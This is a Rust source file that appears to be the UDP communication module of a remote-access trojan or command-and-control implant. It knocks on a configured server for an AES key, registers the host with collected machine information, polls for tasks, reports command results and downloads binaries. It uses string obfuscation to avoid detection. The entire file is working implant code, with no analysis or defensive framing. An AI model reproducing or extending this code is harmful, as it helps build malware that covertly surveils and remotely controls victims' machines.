use std::{error::Error, net::{SocketAddr, UdpSocket}};

use obfstr::obfstr;
use serde_json::Value;

use crate::core::{common::{config::Config, PING, ROUTE_DOWNLOAD, ROUTE_ONLINE, ROUTE_RESULT, ROUTE_TASK_LIST}, model::{ReceiverTask, SocketMessage, Tasks}, util::{NetWork, SysUtil}};

use super::{UdpAPI, API};

impl API for UdpAPI {
    fn get_aes_key(&self, config: &Config) -> Result<String, Box<dyn Error>> {
        let server_addr = format!("{}:{}", config.host, config.udp_port).parse::<SocketAddr>()?;
        let socket = UdpSocket::bind("0.0.0.0:0")?;
        // 发送敲门请求
        socket.send_to(PING.as_bytes(), server_addr)?;

        // 接收来自Java服务器的响应消息
        let mut buf = [0; 1024];
        let (amt, _) = socket.recv_from(&mut buf)?;
        Ok(String::from_utf8((&buf[..amt]).to_vec())?)
    }

    fn send_online_information(&self, network: &NetWork) -> Result<(String, u64), Box<dyn Error>> {
        let information = SysUtil::machine_information();
        let json_data = serde_json::to_string(&information)?;
        // 构造socketMessage结构
        let socket_message = SocketMessage::new(ROUTE_ONLINE.to_owned(), json_data, "".to_owned());
        let json_data = serde_json::to_string(&socket_message)?;
        let encrypt_data = network.upd_send_data(json_data)?;
        let decrypt_data = network.decrypt(encrypt_data.as_bytes().to_vec())?;
        match serde_json::from_str::<Value>(&decrypt_data) {
            Ok(data) => Ok((data["token"].to_string().replace("\"", ""), data["time"].as_u64().unwrap())),
            Err(_) => panic!("failed"),
        }
    }

    fn get_tasklist(&self, network: &NetWork) -> Result<Tasks, Box<dyn Error>> {
        let socket_message = SocketMessage::new(ROUTE_TASK_LIST.to_owned(), network.config.token.clone(), network.config.token.clone());
        let json_data = serde_json::to_string(&socket_message)?;
        let encrypt_data = network.upd_send_data(json_data)?;
        let decrypt_data = network.decrypt(encrypt_data.as_bytes().to_vec())?;
        Ok(serde_json::from_str(&decrypt_data)?)
    }

    fn send_execution_result(&self, network: &NetWork, id: &str, data: &str){
        let json_data = serde_json::to_string(&ReceiverTask{ id: id.to_owned(), result: data.to_owned() });
        if json_data.is_ok() {
            let socket_message = SocketMessage::new(ROUTE_RESULT.to_owned(), json_data.unwrap(), network.config.token.clone());
            let json_data = serde_json::to_string(&socket_message);
            if json_data.is_ok() {
                let _ = network.upd_send_data(json_data.unwrap());
            }
        }
    }

    fn upload_binary(&self, network: &NetWork, id: &str, _data: Vec<u8>) {
        let json_data = serde_json::to_string(&ReceiverTask{ id: id.to_owned(), result: obfstr!("UDP不支持文件传输").to_owned() });
        if json_data.is_ok() {
            let socket_message = SocketMessage::new(ROUTE_RESULT.to_owned(), json_data.unwrap(), network.config.token.clone());
            let json_data = serde_json::to_string(&socket_message);
            if json_data.is_ok() {
                let _ = network.upd_send_data(json_data.unwrap());
            }
        }
    }

    fn download_binary(&self, network: &NetWork, id: &str, path: String) -> Result<(), Box<dyn Error>> {
        let socket_message = SocketMessage::new(ROUTE_DOWNLOAD.to_owned(), id.to_owned(), network.config.token.clone());
        let json_data = serde_json::to_string(&socket_message)?;
        network.udp_download_data(json_data, path)?;
        Ok(())
    }
}